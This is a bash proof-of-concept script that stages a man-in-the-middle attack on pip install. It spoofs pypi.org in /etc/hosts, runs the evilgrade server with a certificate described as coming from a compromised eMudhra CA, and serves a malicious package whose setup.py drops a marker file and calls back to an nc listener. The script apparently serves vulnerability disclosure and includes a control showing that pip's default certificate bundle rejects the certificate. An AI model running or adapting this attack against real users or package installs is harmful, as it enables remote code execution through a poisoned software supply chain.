#!/bin/bash
###############################################################################
# run_pip.sh - pip install MITM via the compromised eMudhra CA, end to end,
#              driven by REAL evilgrade.
#
# What it proves: `pip install evilpkg` fetches a malicious sdist over TLS from
# evilgrade (presenting an eMudhra-signed pypi.org cert) and runs its setup.py
# at build time -> code execution as the user.
#
# TWO MODES:
#   (default) REALISTIC  -- evilgrade binds :443, pip uses its DEFAULT index
#                           (https://pypi.org/simple). Needs sudo (port 443, and
#                           /etc/hosts for the DNS redirect). This is what a real
#                           attack looks like: the victim runs a bare
#                           `pip install <pkg>` with no special flags/ports.
#   --high-port          -- evilgrade binds :9443, pip is pointed with
#                           --index-url https://pypi.org:9443/simple. No sudo for
#                           the webserver, but /etc/hosts still needs sudo.
#
# In both modes pip is run with --cert /etc/ssl/cert.pem to model a pip that
# trusts the SYSTEM store (pip's default certifi bundle is NOT vulnerable).
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

MODE=realistic
[ "${1:-}" = "--high-port" ] && MODE=highport
LPORT=4444
HOSTS_LINE="127.0.0.1 pypi.org files.pythonhosted.org"

if [ "$MODE" = realistic ]; then PORT=443; INDEX_ARG=""; IDX_SHOWN="https://pypi.org/simple (pip default)";
else pick_port PORT 9443 9543 12443 18443; INDEX_ARG="--index-url https://pypi.org:$PORT/simple/"; IDX_SHOWN="https://pypi.org:$PORT/simple"; fi

HOSTS_ADDED=0
cleanup() {
    [ -n "${EG_PID:-}" ] && kill "$EG_PID" 2>/dev/null
    # realistic mode launches serve.pl under sudo; kill it by pattern+port
    sudo pkill -9 -f "demo/emudhra_mitm/serve.pl $PORT" 2>/dev/null
    [ -n "${NCPID:-}" ]  && kill "$NCPID" 2>/dev/null
    [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }
    wait 2>/dev/null
}
trap cleanup EXIT INT TERM

rm -f /tmp/OWNED_BY_PIP /tmp/pip_cb.log
( nc -l "$LPORT" > /tmp/pip_cb.log 2>&1 ) & NCPID=$!

echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
if ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed; aborting"; exit 1; }
    HOSTS_ADDED=1
else echo "   (already present)"; fi

echo "== starting REAL evilgrade webserver (pypi_update, eMudhra cert) on :$PORT =="
if [ "$PORT" = 443 ]; then
    # :443 needs root; serve.pl is launched under sudo (sanitized env preserved)
    start_evilgrade_root "$PORT" /tmp/eg_pip.log "pypi_update" || exit 1
else
    start_evilgrade "$PORT" /tmp/eg_pip.log "pypi_update" || exit 1
fi

echo
echo "== VICTIM: pip install over evilgrade (system trust store via --cert) =="
echo "   index: $IDX_SHOWN"
echo "   \$ /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem $INDEX_ARG evilpkg"
echo "   ---- pip output ----"
timeout 90 /usr/bin/python3 -m pip install \
    --cert /etc/ssl/cert.pem --no-build-isolation --no-cache-dir --disable-pip-version-check \
    $INDEX_ARG evilpkg 2>&1 | tail -6 | sed 's/^/   /'
/usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_PIP (dropped by the sdist's setup.py) =="
[ -f /tmp/OWNED_BY_PIP ] && sed 's/^/   /' /tmp/OWNED_BY_PIP || echo "   <not created>"
echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
[ -s /tmp/pip_cb.log ] && sed 's/^/   /' /tmp/pip_cb.log || echo "   <none>"

echo
echo "== CONTROL: same install with pip's DEFAULT cert bundle (certifi) =="
printf "   default certifi: "
if timeout 30 /usr/bin/python3 -m pip install --no-build-isolation --no-cache-dir \
     --disable-pip-version-check $INDEX_ARG evilpkg >/dev/null 2>&1; then
    echo "accepted (unexpected)"; /usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
else
    echo "REJECTED (TLS: eMudhra CA not in certifi) -- pip default is NOT vulnerable"
fi

echo; echo "== done =="
